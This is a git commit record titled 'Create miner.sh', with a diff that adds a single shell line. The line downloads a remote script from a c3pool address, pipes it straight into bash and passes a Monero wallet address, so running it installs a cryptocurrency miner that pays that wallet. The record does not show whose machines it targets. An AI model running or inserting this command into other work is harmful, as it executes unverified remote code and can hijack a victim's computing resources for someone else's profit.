264fcf09773265ff7c6dcb58bc2621c12a0eaf01
DullJZ <79080562+DullJZ@users.noreply.github.com>
2021-08-15 10:58:48 +0800

    Create miner.sh

---
+++ miner.sh
@@ -0,0 +1,1 @@
+curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 48hjVXYN14XX8vLBdoNxs3CyjNLR8Xj2kLhkP6dgUZX7bXzc8ae4Gd914aTRC7HdKhaEuBtMAaNPq7wgdkNGJyYmBtPVpdz
